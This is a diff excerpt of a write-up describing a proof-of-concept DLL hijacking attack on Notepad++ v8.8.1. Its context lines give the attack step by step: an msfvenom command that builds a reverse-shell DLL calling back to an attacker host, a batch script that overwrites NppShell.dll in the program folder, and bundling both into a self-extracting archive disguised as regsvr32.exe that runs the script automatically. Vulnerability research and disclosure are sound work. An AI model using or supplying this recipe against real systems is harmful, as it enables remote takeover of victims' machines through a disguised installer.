@@ -15,6 +15,7 @@ I tried demonstrate a proof-of-concept (PoC) exploit targeting Notepad++ v8.8.1,
 DLL hijacking is a well-known attack technique where an application loads a malicious DLL instead of a legitimate one due to insecure search paths or missing integrity checks. Once the application loads the malicious DLL, attacker-controlled code executes in the context of the application.
 
 🛠️ Environment setup
+
 Victim machine: Windows 11 with Notepad++ v8.8.1 installed
 
 Attacker machine: Kali Linux (any ver)
@@ -22,12 +23,15 @@ Attacker machine: Kali Linux (any ver)
 Tools used: msfvenom, batch scripting, WinRAR (SFX builder)
 
 #  Step-by-step exploit process
+
 1️⃣ Create the malicious NppShell.dll
+
 On Kali, generate a reverse shell DLL payload using msfvenom:
 
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_port> -f dll -o NppShell.dll
 
 2️⃣ Prepare an installer batch script
+
 Write a simple install.bat:
 
 echo off
@@ -39,6 +43,7 @@ copy /Y NppShell.dll "C:\Program Files\Notepad++\contextMenu\NppShell.dll"
 This script overwrites the legitimate NppShell.dll in Notepad++.
 
 3️⃣ Bundle files using SFX archive
+
 Bundle NppShell.dll and install.bat into a self-extracting (SFX) archive named regsvr32.exe.
 
 Configure SFX to automatically run install.bat after extraction.
